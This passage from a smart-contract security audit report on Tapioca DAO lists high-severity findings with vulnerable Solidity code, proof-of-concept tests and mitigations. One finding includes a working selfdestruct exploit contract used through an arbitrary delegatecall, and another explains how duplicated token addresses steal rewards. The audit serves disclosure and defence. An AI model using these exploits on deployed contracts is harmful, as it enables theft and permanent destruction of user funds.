https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/2286f80f928f41c8bc189d0657d74ba83286c668/contracts/markets/Market.sol#L423-L424
function_isSolvent(addressuser,uint256_exchangeRate)internalviewreturns(bool) {...returnyieldBox.toAmount(collateralId,collateralShare*(EXCHANGE_RATE_PRECISION/FEE_PRECISION) *collateralizationRate,false) >=//@audit - note that the collateralizion calculation is based on borrowed amount with fees (using totalBorrow.elastic)// Moved exchangeRate here instead of dividing the other side to preserve more precision(borrowPart*_totalBorrow.elastic*_exchangeRate) /_totalBorrow.base;}
As the protocol uses a dynamic liquidation incentives mechanism (see below), the liquidator will be given more rewards than required if the liquidator reward is derived by borrowed amount without accumulated fees. That is because the dynamic liquidation incentives mechanism decreases the rewards as it reaches 100% LTV. So computing the liquidator rewards using a lower value (without fees) actually gives liquidator a higher portion of the rewards.
https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/2286f80f928f41c8bc189d0657d74ba83286c668/contracts/markets/Market.sol#L442-L462
function_getCallerReward(uint256borrowed,uint256startTVLInAsset,uint256maxTVLInAsset)internalviewreturns(uint256) {if(borrowed==0)return0;if(startTVLInAsset==0)return0;if(borrowed<startTVLInAsset)return0;if(borrowed>=maxTVLInAsset)returnminLiquidatorReward;uint256rewardPercentage= ((borrowed-startTVLInAsset) *FEE_PRECISION) / (maxTVLInAsset-startTVLInAsset);int256diff=int256(minLiquidatorReward) -int256(maxLiquidatorReward);int256reward= (diff*int256(rewardPercentage)) /int256(FEE_PRECISION) +int256(maxLiquidatorReward);returnuint256(reward);}
Impact
The protocol is shortchanged as it gives liquidator more rewards than required.
Proof of Concept
Add the following console.log toBigBang.sol#L581`
console.log("    callerReward (without fees) =\t%d (actual)",callerReward);callerReward=_getCallerReward(//userBorrowPart[user],//@audit borrowed amount with fees(userBorrowPart[user] *totalBorrow.elastic) /totalBorrow.base,startTVLInAsset,maxTVLInAsset);console.log("    callerReward (with fees)  =\t%d (expected)",callerReward);
Add and run the following test inbigBang.test.ts. The console.log will show that the expected liquidator reward is lower when computed using borrowed amount with fees.
it.only('peakbolt - liquidation reward computation',async()=>{const{wethBigBangMarket,weth,wethAssetId,yieldBox,deployer,eoa1,__wethUsdcPrice,__usd0WethPrice,multiSwapper,usd0WethOracle,timeTravel,} =awaitloadFixture(register);awaitweth.approve(yieldBox.address,ethers.constants.MaxUint256);awaityieldBox.setApprovalForAll(wethBigBangMarket.address,true);awaitweth.connect(eoa1).approve(yieldBox.address,ethers.constants.MaxUint256);awaityieldBox.connect(eoa1).setApprovalForAll(wethBigBangMarket.address,true);constwethMintVal=ethers.BigNumber.from((1e18).toString()).mul(10,);awaitweth.connect(eoa1).freeMint(wethMintVal);constvalShare=awaityieldBox.toShare(wethAssetId,wethMintVal,false,);awaityieldBox.connect(eoa1).depositAsset(wethAssetId,eoa1.address,eoa1.address,0,valShare,);console.log("wethMintVal = %d",wethMintVal);console.log("__wethUsdcPrice = %d",__wethUsdcPrice);console.log("--------------------- addCollateral ------------------------");awaitwethBigBangMarket.connect(eoa1).addCollateral(eoa1.address,eoa1.address,false,0,valShare);//borrowconstusdoBorrowVal=wethMintVal.mul(74).div(100).mul(__wethUsdcPrice.div((1e18).toString()));console.log("--------------------- borrow ------------------------");awaitwethBigBangMarket.connect(eoa1).borrow(eoa1.address,eoa1.address,usdoBorrowVal);// Can't liquidateconstswapData=newethers.utils.AbiCoder().encode(['uint256'],[1],);timeTravel(100*86400);console.log("--------------------- price drop ------------------------");constpriceDrop=__usd0WethPrice.mul(15).div(10).div(100);awaitusd0WethOracle.set(__usd0WethPrice.add(priceDrop));awaitwethBigBangMarket.updateExchangeRate();constborrowPart=awaitwethBigBangMarket.userBorrowPart(eoa1.address,);console.log("--------------------- liquidate (success) ------------------------");awaitexpect(wethBigBangMarket.liquidate([eoa1.address],[borrowPart],multiSwapper.address,swapData,),).to.not.be.reverted;return;});
Recommended Mitigation Steps
ChangeBigBang.sol#L576-L580,SGLLiquidation.sol#L310-L314,Market.sol#L364from
uint256callerReward=_getCallerReward(userBorrowPart[user],startTVLInAsset,maxTVLInAsset);
to
uint256callerReward=_getCallerReward((userBorrowPart[user] *totalBorrow.elastic) /totalBorrow.base,startTVLInAsset,maxTVLInAsset);
0xRektora (Tapioca) confirmed via duplicate issue 89

[H-22] Lack of safety buffer between liquidation threshold and LTV ratio for borrowers to prevent unfair liquidations
Submitted bypeakbolt
In BigBang and Singularity, there is no safety buffer between liquidation threshold and LTV ratio, to protects borrowers from being immediately liquidated due to minor market movement when the loan is taked out at max LTV.
The safety buffer also ensure that the loans can be returned to a healthy state after the first liquidation. Otherwise, the loan can be liquidated repeatly as it will remain undercollateralized after the first liquidation.
Detailed Explanation
ThecollateralizationRatedetermines the LTV ratio for the max amount of assets that can be borrowed with the specific collateral. This check is implemented in_isSolvent()as shown below.
https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/2286f80f928f41c8bc189d0657d74ba83286c668/contracts/markets/Market.sol#L402-L425
function_isSolvent(addressuser,uint256_exchangeRate)internalviewreturns(bool) {// accrue must have already been called!uint256borrowPart=userBorrowPart[user];if(borrowPart==0)returntrue;uint256collateralShare=userCollateralShare[user];if(collateralShare==0)returnfalse;Rebasememory_totalBorrow=totalBorrow;returnyieldBox.toAmount(collateralId,collateralShare*(EXCHANGE_RATE_PRECISION/FEE_PRECISION) *collateralizationRate,false) >=// Moved exchangeRate here instead of dividing the other side to preserve more precision(borrowPart*_totalBorrow.elastic*_exchangeRate) /_totalBorrow.base;}
However, the liquidation start threshold, which is supposed to be higher (e.g. 80%) than LTV ratio (e.g. 75%), is actually using the samecollateralizationRatevalue. We can see thatcomputeClosingFactor()allow liquidation to start when the loan is at max LTV.
https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/2286f80f928f41c8bc189d0657d74ba83286c668/contracts/markets/Market.sol#L283-L284
uint256liquidationStartsAt= (collateralPartInAssetScaled*collateralizationRate) / (10**ratesPrecision);
Impact
Borrowers can be unfairly liquidated and penalized due to minor market movement when taking loan at max LTV. Also loan can be repeatedly liquidated regardless of closing factor as it does not return to healthy state after the first liquidation.
Proof of Concept
Consider the following scenario,
Borrower take out loan at max LTV (75%).Immediately after the loan is taken out, the collateral value dropped slightly due to minor market movement and the loan is now at 75.000001% LTV.However, as the liquidation start threshold begins to at 75% LTV, bots start to liquidate the loan, before the borrower could react and repay the loan.The liquidation will cause the loan to remain undercollateralized despite the closing factor.As the loan is still unhealthy, the bots will then be able to repeatly liquidate the loan.Borrower is unfairly penalized and suffers losses due to the liquidations.
Recommended Mitigation Steps
Implement the liquidation threshold as a separate state variable and ensure it is higher than LTV to provide a safety buffer for borrowers.
cryptotechmaker (Tapioca) confirmed and commented:
The user is not liquidated for his entire position but only for the amount necessary for the loan to become solvent again.
Loaning up to the collateralization rate threshold is up to the user and opening such an edging position comes with some risks that the user should be aware of.However, adding the buffer seems fair. It can remain as a ‘High’.

[H-23] Refund mechanism for failed cross-chain transactions does not work
Submitted bypeakbolt, also found byKaysoft,windhustler, carrotsmuggler (1,2),xuwinnie, andcergyk
https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/2286f80f928f41c8bc189d0657d74ba83286c668/contracts/usd0/modules/USDOLeverageModule.sol#L180-L185
https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/2286f80f928f41c8bc189d0657d74ba83286c668/contracts/usd0/modules/USDOMarketModule.sol#L178-L186
https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/2286f80f928f41c8bc189d0657d74ba83286c668/contracts/usd0/modules/USDOOptionsModule.sol#L187-L197
https://github.com/Tapioca-DAO/tapiocaz-audit/blob/bcf61f79464cfdc0484aa272f9f6e28d5de36a8f/contracts/tOFT/modules/BaseTOFTLeverageModule.sol#L195-L200
https://github.com/Tapioca-DAO/tapiocaz-audit/blob/bcf61f79464cfdc0484aa272f9f6e28d5de36a8f/contracts/tOFT/modules/BaseTOFTMarketModule.sol#L170-L175
https://github.com/Tapioca-DAO/tapiocaz-audit/blob/bcf61f79464cfdc0484aa272f9f6e28d5de36a8f/contracts/tOFT/modules/BaseTOFTOptionsModule.sol#L202-L212
https://github.com/Tapioca-DAO/tapiocaz-audit/blob/bcf61f79464cfdc0484aa272f9f6e28d5de36a8f/contracts/tOFT/modules/BaseTOFTStrategyModule.sol#L163-L168
There is a refund mechanism inUSDOandTOFTmodules that will return funds when the execution on the destination chain fails.
It happens whenmodule.delegatecall()fails, where the following code (see below) will trigger a refund of the bridged fund to the user. After that a revert is then ‘forwarded’ to the main executor contract (BaseUSDOorBaseTOFT).
However, the issue is that the revert will also reverse the refund even when the revert is forwarded.
https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/2286f80f928f41c8bc189d0657d74ba83286c668/contracts/usd0/modules/USDOLeverageModule.sol#L180-L185
if(!success) {if(balanceAfter-balanceBefore>=amount) {IERC20(address(this)).safeTransfer(leverageFor,amount);}//@audit - this revert will actually reverse the refund before thisrevert(_getRevertMsg(reason));//forward revert because it's handled by the main executor}
Although the main executor contract will_storeFailedMessage()to allow users toretryMessage()and re-execute the failed transaction, it will not go through if the error is permanent. That means theretryMessage()will also revert and there is no way to recover the funds.
Impact
User will lose their bridged fund if the cross chain execution encounters a permanent error, which will permanently lock up the bridged funds in the contract as there is no way to recover it.
Proof of Concept
Add arevert()inleverageUpInternal()withinUSDOLeverageModule.sol#L197as follows, to simulate a permanent failure for the remote execution at destination chain.
https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/2286f80f928f41c8bc189d0657d74ba83286c668/contracts/usd0/modules/USDOLeverageModule.sol#L197.
functionleverageUpInternal(uint256amount,IUSDOBase.ILeverageSwapDatamemoryswapData,IUSDOBase.ILeverageExternalContractsDatamemoryexternalData,IUSDOBase.ILeverageLZDatamemorylzData,addressleverageFor)publicpayable{//@audit - to simulate a permanent failure for this remote execution (e.g. issue with swap)revert();...}
Add the followingconsole.logtosingularity.test.ts#L4113
console.log("USDO_10 balance for deployer.address (expected to be equal to 10000000000000000000) : ",awaitUSDO_10.balanceOf(deployer.address));
Run the test case'should bounce between 2 chains'under'multiHopBuyCollateral()'tests insingularity.test.ts. It will show that thedeployer.addressfails to receive the refund amount.
Recommended Mitigation Steps
Implement a ‘pull’ mechanism for users to withdraw the refund instead of ‘pushing’ to the user.
That can be done by using a a new state variable withinUSDOandTOFTto store the refund amount for the transaction with the correspondingpayloadHashforfailedMessagesmapping.
Checks must be implemented to ensure that if user withdraws the refund, the correspondingfailedMessagesentry is cleared so that the user cannot retry the transaction again.
Similarly, ifretryMessage()is used to re-execute the transaction successfully, the refund amount in the new state variable should be cleared.
0xRektora (Tapioca) confirmed via duplicate issue #1410

[H-24] Incorrect formula used in functionMarket.computeClosingFactor()
Submitted byKIntern_NA, also found bycarrotsmugglerand0xRobocop
Incorrect amount of assets that will be liquidated
Proof of Concept
FunctionBigBang._liquidateUser()is used to liquidate an under-collateralization position in the market. This function callsBigBang._updateBorrowAndCollateralShare()to calculate the amount ofborrowPartandcollateralSharethat will be removed from the user’s position and update the storage.
The amount ofborrowPartto be removed can be calculated using the functionMarket.computeClosingFactor(). This amount will then be converted toborrowAmount, which is the corresponding elastic amount, and be used to determine the amount ofcollateralSharethat needs to be removed.
Link to function
However, the returned value fromMarket.computeClosingFactor()is incorrect, which leads to the wrong update for the user’s position.
To prove the statement above, let’s denote:
x: The elastic amount that will be removed to execute the liquidation.userElasticanduserElastic': The elastic amount corresponding touserBorrowPart[user]before and after the liquidation.collateralShareandcollateralShare': The value ofuserCollateralShare[user]before and after the liquidation.Following the implementation ofyieldBox.toAmount()andyieldBox.toShare(), in one transaction we can denote that:yieldBox.toAmount(): A multiplication expression with a constantC.yieldBox.toShare(): A division expression with constantC.
Following the update of these variables depicted in the functionBigBang._updateBorrowAndCollateralShare(), we have:
$userElastic' = userElastic - x$$collateralShare' = collateralShare - \frac{x \times (1+liquidationMultiplier)*\frac{exchangeRate}{10^{18}}}{C}$
After the liquidation, the functionMarket._isSolvent(user)must return true. In other words, at least the followingequationshould hold:
$C \times (collateralShare' \times \frac{collateralRate}{10^5} \times \frac{10^{18}}{exchangeRate}) = userElastic'$
Solving the equation, we get:
$C \times (collateralShare' \times \frac{collateralRate}{10^5} \times \frac{10^{18}}{exchangeRate}) = userElastic'$$C \times collateralShare \times \frac{collateralRate}{10^5} \times \frac{10^{18}}{exchangeRate} - x \times (1 + \frac{liquidationMultiplier}{10^5}) \times \frac{collateralizationRate}{10^5} = userElastic - x$$x = \frac{userElastic - C \times collateralShare \times \frac{collateralRate}{10^5} \times \frac{10^{18}}{exchangeRate}}{1 - (1 + \frac{liquidationMultiplier}{10^5}) * \frac{collateralizationRate}{10^5}}$
So, the returned value of the functionMarket.computeClosingFactor()should be the corresponding base amount ofx(totalBorrow.toBase(x, false)).
Comparing it to the currentimplementationofcomputeClosingFactor(), we can see the issues are:
The implementation uses theborrowPartin the numerator instead of the corresponding elastic amount ofborrowPart.The multiplication withborrowPartDecimalsandcollateralPartDecimalsdoesn’t make sense since these decimals can be different and may cause the numerator to underflow.
Recommended Mitigation Steps
Correct the formula of functioncomputeClosingFactor()following the section “Proof of Concept”.
cryptotechmaker (Tapioca) confirmed

[H-25] Overflow risk in Market contract
Submitted byKIntern_NA
https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/2286f80f928f41c8bc189d0657d74ba83286c668/contracts/markets/Market.sol#L415-L421
https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/2286f80f928f41c8bc189d0657d74ba83286c668/contracts/markets/Market.sol#L390-L396
Actions of users (borrow, repay, removeCollateral, …) in Martket contract might be reverted by overflow, resulting in their funds might be frozen.
Proof of concept
Function_isSolventinMarketcontract use conversion from share to amount of yieldBox.
yieldBox.toAmount(collateralId,collateralShare*(EXCHANGE_RATE_PRECISION/FEE_PRECISION) *collateralizationRate,false)
It will trigger_toAmountfunction inYieldBoxRebasecontract
function_toAmount(uint256share,uint256totalShares_,uint256totalAmount,boolroundUp)internalpurereturns(uint256amount) {totalAmount++;totalShares_+=1e8;amount= (share*totalAmount) /totalShares_;if(roundUp&& (amount*totalShares_) /totalAmount<share) {amount++;}}
The calculationamount = (share * totalAmount) / totalShares_might be overflow becauseshare * totalAmount=collateralShare * (EXCHANGE_RATE_PRECISION / FEE_PRECISION) * collateralizationRate * totalAmount
In the default condition,EXCHANGE_RATE_PRECISION= 1e18,FEE_PRECISION= 1e5,collateralizationRate= 0.75e18
ThecollateralShareis equal to around1e8 * collateralAmountby default (becausetotalAmount++; totalShares_ += 1e8;is present in the_toAmountfunction).
=>share * totalAmount~= (collateralAmount * 1e8) * (1e18 / 1e5) * 0.75e18 * totalAmount = collateralAmount * totalAmount * 0.75e39
This formula will overflow whencollateralAmount * totalAmount> 1.5e38. This situation can occur easily with 18-decimal collateral. As a consequence, user transactions will revert due to overflow, resulting in the freezing of market functionalities.
The same issue applies to the calculation of_computeMaxBorrowableAmountin the Market contract.
Recommended Mitigation Steps
Reduce some variables used to trigger yieldBox.toAmount(), such asEXCHANGE_RATE_PRECISIONandcollateralizationRate, and use these variables to calculate with the obtained amount.
Example, the expected amount can be calculated as:
yieldBox.toAmount(collateralId,collateralSharefalse) * (EXCHANGE_RATE_PRECISION/FEE_PRECISION) *collateralizationRate
0xRektora (Tapioca) confirmed

[H-26] Not enough TAP tokens to exercise if a user participates and exercises in the same epoch
Submitted byKIntern_NA
Users were unable to purchase their deserved amount of TAPs
Proof of Concept
During eachepochand for a specificsglAssetID, there is a fixed amount of TAP tokens that will be minted and stored in the STORAGE mappingsingularityGauges[epoch][sglAssetID]. Users have the option to purchase these TAP tokens by first calling the functionTapiocaOptionBroker.participate()and then executingTapiocaOptionBroker.exerciseOption()before the position expires to buy TAPs at a discounted price. The amount of TAP tokens that a user can purchase with each position can be calculated using the formula:
eligibleTapAmount = position.amount * gaugeTotalForEpoch / totalPoolDeposited- position.amount: The locked amount of the position in `sglAssetId`.- gaugeTotalForEpoch: The total number of TAP tokens that can be minted for the `(epoch, sglAssetId)`.- totalPoolDeposited: The total locked amount of all positions in `sglAssetId`.
The flaw arises when a user who participates insglAssetIdin the current epoch can immediately callexerciseOption()to purchase the TAP tokens. This results in a situation where the participants cannot exercise their expected TAP tokens.
For example:
Both Alice and Bob participate in the broker withposition.amount = 1.The amount of TAP tokens allocated for the current epoch isgaugeTotalForEpoch = 60.Alice callsexerciseOption()to buyeligibleAmount = 1 * 60 / 2 = 30TAPs.In the same epoch, Candice participates in the broker withposition.amount = 1and immediately callsexerciseOption(). She will buyeligibleAmount = 1 * 60 / 3 = 20TAPs.When Bob callsexerciseOption, he can buyeligibleAmount = 1 * 60 / 3 = 20TAPs, but this cannot happen since if Bob decides to buy 20 TAPs, the total minted amount of TAPs will exceedgaugeTotalForEpoch(30 + 20 + 20 = 70 > 60), resulting in a revert.
Recommended Mitigation Steps
Consider developing a technique similar to the one implemented intwTAP.solfor storing thenetAmounts. When a user participates in the broker, perform the following actions:
netAmounts[block.timestamp+1] += lock.amountnetAmounts[lockTime+lockDuration] += lock.amount
0xRektora (Tapioca) confirmed

[H-27] Attacker can pass duplicated reward token addresses to steal the reward of contracttwTAP.sol
Submitted byKIntern_NA, also found bybin2chenandglcanvas
The attacker can exploit the contracttwTAP.solto steal rewards.
Proof of Concept
The functiontwTAP.claimAndSendRewards() -> twTAP._claimRewardsOn()is intended for users who utilize the cross-chain message ofBaseTOFT.solto claim a specific set of reward tokens.
function_claimRewardsOn(uint256_tokenId,address_to,IERC20[]memory_rewardTokens)internal{uint256[]memoryamounts=claimable(_tokenId);unchecked{uint256len=_rewardTokens.length;for(uint256i=0;i<len; ) {uint256claimableIndex=rewardTokenIndex[_rewardTokens[i]];uint256amount=amounts[i];if(amount>0) {// Math is safe: `amount` calculated safely in `claimable()`claimed[_tokenId][claimableIndex] +=amount;rewardTokens[claimableIndex].safeTransfer(_to,amount);}++i;}}}
The internal function iterates through the list of reward tokens specified by the user after calculating the claimable amount for each token in the STORAGE arraytwTAP.rewardTokens[]. Unfortunately, there is no check if the_rewardTokenscontain duplicated reward tokens, and the functionclaimable(_tokenId)is not called after each iteration, which allows the attacker to manipulate the function call using the same reward address repeatedly.
For example,
STORAGE arrayrewardTokens[] = [usdc, usdt]The function_claimRewardsOn()is called with_rewardTokens[] = [usdt, usdt]. In each iteration, theclaimableIndexwill berewardTokenIndex[usdc] = 0, which transfers the usdt two times to the attacker.
Recommended Mitigation Steps
One solution to mitigate this issue is to require the MEMORY array_rewardTokensto be sorted in ascending order.
function_claimRewardsOn(uint256_tokenId,address_to,IERC20[]memory_rewardTokens)internal{uint256[]memoryamounts=claimable(_tokenId);unchecked{uint256len=_rewardTokens.length;for(uint256i=0;i<len; ) {// CHANGE HEREif(i!=0) {require(_rewardTokens[i] >_rewardTokens[i-1]);}uint256claimableIndex=rewardTokenIndex[_rewardTokens[i]];uint256amount=amounts[i];if(amount>0) {// Math is safe: `amount` calculated safely in `claimable()`claimed[_tokenId][claimableIndex] +=amount;rewardTokens[claimableIndex].safeTransfer(_to,amount);}++i;}}}
By ensuring that the reward tokens are sorted in ascending order, we can prevent the exploit where the attacker claims the same reward token multiple times and effectively mitigate the vulnerability.
0xRektora (Tapioca) confirmed via duplicate issue 1304

[H-28] TOFT and USDO Modules Can Be Selfdestructed
Submitted byAck, also found byBPZ,Breeje,ladboy233,offside0011,Kaysoft,0x73696d616f,0xrugpull_detector,carrotsmuggler,CrypticShepherd,ACai,kodyvim, andcergyk
https://github.com/Tapioca-DAO/tapiocaz-audit/blob/bcf61f79464cfdc0484aa272f9f6e28d5de36a8f/contracts/tOFT/modules/BaseTOFTLeverageModule.sol#L184-L193
https://github.com/Tapioca-DAO/tapiocaz-audit/blob/bcf61f79464cfdc0484aa272f9f6e28d5de36a8f/contracts/tOFT/modules/BaseTOFTMarketModule.sol#L160-L168
https://github.com/Tapioca-DAO/tapiocaz-audit/blob/bcf61f79464cfdc0484aa272f9f6e28d5de36a8f/contracts/tOFT/modules/BaseTOFTOptionsModule.sol#L189-L200>
https://github.com/Tapioca-DAO/tapiocaz-audit/blob/bcf61f79464cfdc0484aa272f9f6e28d5de36a8f/contracts/tOFT/modules/BaseTOFTStrategyModule.sol#L152-L162
https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/2286f80f928f41c8bc189d0657d74ba83286c668/contracts/usd0/modules/USDOLeverageModule.sol#L169-L1788
https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/2286f80f928f41c8bc189d0657d74ba83286c668/contracts/usd0/modules/USDOMarketModule.sol#L168-L176
https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/2286f80f928f41c8bc189d0657d74ba83286c668/contracts/usd0/modules/USDOOptionsModule.sol#L174-L185
All TOFT and USDO modules have public functions that allow an attacker to supply an addressmodulethat is later used as a destination for a delegatecall. This can point to an attacker-controlled contract that is used to selfdestruct the module.
// USDOLeverageModule:leverageUpfunctionleverageUp(addressmodule,uint16_srcChainId,bytesmemory_srcAddress,uint64_nonce,bytesmemory_payload)public{// .. snip ..(boolsuccess,bytesmemoryreason) =module.delegatecall(//@audit-issue arbitrary destination delegatecallabi.encodeWithSelector(this.leverageUpInternal.selector,amount,swapData,externalData,lzData,leverageFor));if(!success) {if(balanceAfter-balanceBefore>=amount) {IERC20(address(this)).safeTransfer(leverageFor,amount);}revert(_getRevertMsg(reason));//forward revert because it's handled by the main executor}// .. snip ..}
Impact
Both BaseTOFT and BaseUSDO initialize the module addresses to state variables in the constructor. Because there are no setter functions to adjust these variables post-deployment, the modules are permanently locked to the addresses specified in the constructor. If those addresses are selfdestructed, the modules are rendered unusable and all calls to these modules will revert. This cannot be repaired.
BaseUSDO.sol:constructor
// BaseUSDO.sol:constructorconstructor(address_lzEndpoint,IYieldBoxBase_yieldBox,address_owner,addresspayable_leverageModule,addresspayable_marketModule,addresspayable_optionsModule)BaseUSDOStorage(_lzEndpoint,_yieldBox)ERC20Permit("USDO") {leverageModule=USDOLeverageModule(_leverageModule);marketModule=USDOMarketModule(_marketModule);optionsModule=USDOOptionsModule(_optionsModule);transferOwnership(_owner);}
Proof of Concept
Attacker can deploy theExploitcontract below, and then call each of the vulnerable functions with the address of theExploitcontract as themoduleparameter. This will cause the module to selfdestruct, rendering it unusable.
pragmasolidity^0.8.18;contractExploit{addresspayableconstantattacker=payable(address(0xbadbabe));fallback()externalpayable{selfdestruct(attacker);}}
Recommended Mitigation Steps
Themoduleparameter should be removed from the calldata in each of the vulnerable functions. Since the context of the call into these functions are designed to be delegatecalls and the storage layouts of the modules and the Base contracts are the same, themoduleaddress can be retreived from storage instead. This will prevent attackers from supplying arbitrary addresses as delegatecall destinations.
0xRektora (Tapioca) confirmed via duplicate issue 146

[H-29] Exercise option cross chain message in the (m)TapiocaOFT will always revert in the destination, losing debited funds in the source chain
Submitted by0x73696d616f, also found byKIntern_NAandbin2chen
https://github.com/Tapioca-DAO/tapiocaz-audit/blob/bcf61f79464cfdc0484aa272f9f6e28d5de36a8f/contracts/tOFT/BaseTOFT.sol#L539-L545
https://github.com/Tapioca-DAO/tapiocaz-audit/blob/bcf61f79464cfdc0484aa272f9f6e28d5de36a8f/contracts/tOFT/modules/BaseTOFTOptionsModule.sol#L153-L159
Exercise option cross chain message in the(m)TapiocaOFTwill always revert in the destination, but works in the source chain, where it debits the funds from users. Thus, these funds will not be credited in the destination and are forever lost.
Proof of Concept
In theBaseTOFT, if the packet from the received cross chain message inlzReceive()is of typePT_TAP_EXERCISE, it delegate calls to theBaseTOFTOptionsModule:
function_nonblockingLzReceive(uint16_srcChainId,bytesmemory_srcAddress,uint64_nonce,bytesmemory_payload)internalvirtualoverride{uint256packetType=_payload.toUint256(0);...}elseif(packetType==PT_TAP_EXERCISE) {_executeOnDestination(Module.Options,abi.encodeWithSelector(BaseTOFTOptionsModule.exercise.selector,_srcChainId,_srcAddress,_nonce,_payload),_srcChainId,_srcAddress,_nonce,_payload);...
In theBaseTOFTOptionsModule, theexercise()function is declared as:
functionexercise(addressmodule,uint16_srcChainId,bytesmemory_srcAddress,uint64_nonce,bytesmemory_payload)public{...}
Notice that theaddress moduleargument is specified in theexercise()function declaration, but not in the_nonBlockingLzReceive()call to it. This will make the message always revert because it fails when decoding the arguments to the function call, due to the extraaddress moduleargument.
The following POC illustrates this behaviour. TheexerciseOption()cross chain message fails on the destination:
// SPDX-License-Identifier: UNLICENSEDpragmasolidity^0.8.18;import{Test,console}from"forge-std/Test.sol";import{TapiocaOFT}from"contracts/tOFT/TapiocaOFT.sol";import{BaseTOFTOptionsModule}from"contracts/tOFT/modules/BaseTOFTOptionsModule.sol";import{IYieldBoxBase}from"tapioca-periph/contracts/interfaces/IYieldBoxBase.sol";import{ISendFrom}from"tapioca-periph/contracts/interfaces/ISendFrom.sol";import{ICommonData}from"tapioca-periph/contracts/interfaces/ICommonData.sol";import{ITapiocaOptionsBrokerCrossChain}from"tapioca-periph/contracts/interfaces/ITapiocaOptionsBroker.sol";contractTapiocaOFTPOCisTest{addresspublicconstantLZ_ENDPOINT=0x66A71Dcef29A0fFBDBE3c6a460a3B5BC225Cd675;uint16internalconstantPT_TAP_EXERCISE=777;eventMessageFailed(uint16_srcChainId,bytes_srcAddress,uint64_nonce,bytes_payload,bytes_reason);functiontest_POC_ExerciseWrongArguments()public{vm.createSelectFork("https://eth.llamarpc.com");addressoptionsModule_=address(newBaseTOFTOptionsModule(address(LZ_ENDPOINT),address(0),IYieldBoxBase(address(2)),"SomeName","SomeSymbol",18,block.chainid));TapiocaOFTtapiocaOft_=newTapiocaOFT(LZ_ENDPOINT,address(0),IYieldBoxBase(address(3)),"SomeName","SomeSymbol",18,block.chainid,payable(address(1)),payable(address(2)),payable(address(3)),payable(optionsModule_));addressuser_=makeAddr("user");deal(user_,2ether);vm.prank(user_);tapiocaOft_.wrap{value:1ether}(user_,user_,1ether);ITapiocaOptionsBrokerCrossChain.IExerciseOptionsDatamemoryoptionsData_;ITapiocaOptionsBrokerCrossChain.IExerciseLZDatamemorylzData_;ITapiocaOptionsBrokerCrossChain.IExerciseLZSendTapDatamemorytapSendData_;ICommonData.IApproval[]memoryapprovals_;optionsData_.from=user_;optionsData_.target=user_;optionsData_.paymentTokenAmount=1ether;optionsData_.oTAPTokenID=1;optionsData_.paymentToken=address(0);optionsData_.tapAmount=1ether;lzData_.lzDstChainId=102;lzData_.zroPaymentAddress=address(0);lzData_.extraGas=200_000;tapSendData_.withdrawOnAnotherChain=false;tapSendData_.tapOftAddress=address(0);tapSendData_.lzDstChainId=102;tapSendData_.amount=0;tapSendData_.zroPaymentAddress=address(0);tapSendData_.extraGas=0;tapiocaOft_.setTrustedRemoteAddress(102,abi.encodePacked(tapiocaOft_));vm.prank(user_);tapiocaOft_.exerciseOption{value:1ether}(optionsData_,lzData_,tapSendData_,approvals_);bytesmemorylzPayload_=abi.encode(PT_TAP_EXERCISE,optionsData_,tapSendData_,approvals_);vm.prank(LZ_ENDPOINT);vm.expectEmit(true,true,true,true,address(tapiocaOft_));emitMessageFailed(102,abi.encodePacked(tapiocaOft_,tapiocaOft_),0,lzPayload_,vm.parseBytes("0x4e487b710000000000000000000000000000000000000000000000000000000000000041"));tapiocaOft_.lzReceive(102,abi.encodePacked(tapiocaOft_,tapiocaOft_),0,lzPayload_);}}
Tools Used
Vscode, Foundry
Recommended Mitigation Steps
Adding the extra module parameter when encoding the function call in_nonBlockingLzReceive()would be vulnerable to someone calling theBaseTOFTOptionsModuledirectly on functionexercise()with a maliciousmoduleargument. It’s safer to remove themoduleargument and callexerciseInternal()directly, which should work since it’s apublicfunction.
function_nonblockingLzReceive(uint16_srcChainId,bytesmemory_srcAddress,uint64_nonce,bytesmemory_payload)internalvirtualoverride{uint256packetType=_payload.toUint256(0);...}elseif(packetType==PT_TAP_EXERCISE) {_executeOnDestination(Module.Options,abi.encodeWithSelector(BaseTOFTOptionsModule.exercise.selector,address(optionsModule),// here_srcChainId,_srcAddress,_nonce,_payload),_srcChainId,_srcAddress,_nonce,_payload);...
0xRektora (Tapioca) confirmed

[H-30]utilizationfor_getInterestRate()does not factor in interest
Submitted byItsNio, also found byItsNioandSaeedAlipoor01988
The calculation forutilizationin_getInterestRate()does not factor in the accrued interest. This leads to_accrueInfo.interestPerSecondbeing under-represented, and leading to incorrect interest rate calculation and potentially endangering conditions such asutilization > maximumTargetUtilizationon line124.
Proof of Concept
The calculation forutilizationin the_getInterestRate()function forSGLCommon.soloccurs on lines61-64as a portion of thefullAssetAmount(which is also problematic) and the_totalBorrow.elastic. However,_totalBorrow.elasticis accrued by interest on line99. This accrued amount is not factored into the calculation forutilization, which will be used to update the new interest rate, as purposed by the comment on line111.
Recommended Mitigation Steps
Factor in the interest accrual into theutilizationcalculation:
...// Accrue interestextraAmount =(uint256(_totalBorrow.elastic) *_accrueInfo.interestPerSecond *elapsedTime) /1e18;_totalBorrow.elastic += uint128(extraAmount);+    uint256 fullAssetAmount = yieldBox.toAmount(+        assetId,+        _totalAsset.elastic,+        false+    ) + _totalBorrow.elastic;//@audit utilization factors in accrual+    utilization = fullAssetAmount == 0+   ? 0+        : (uint256(_totalBorrow.elastic) * UTILIZATION_PRECISION) /+        fullAssetAmount;...
0xRektora (Tapioca) confirmed

[H-31] Collateral can be locked in BigBang contract whendebtStartPointis nonzero
Submitted byzzzitron, also found byminhtrng,RedOneN,kutugu,bin2chen,0xSky,0xrugpull_detector,mojito_auditor,plainshift,KIntern_NA,carrotsmuggler,zzebra83,0xRobocop, andchaduke
https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/2286f80f928f41c8bc189d0657d74ba83286c668/contracts/Penrose.sol#L395-L397
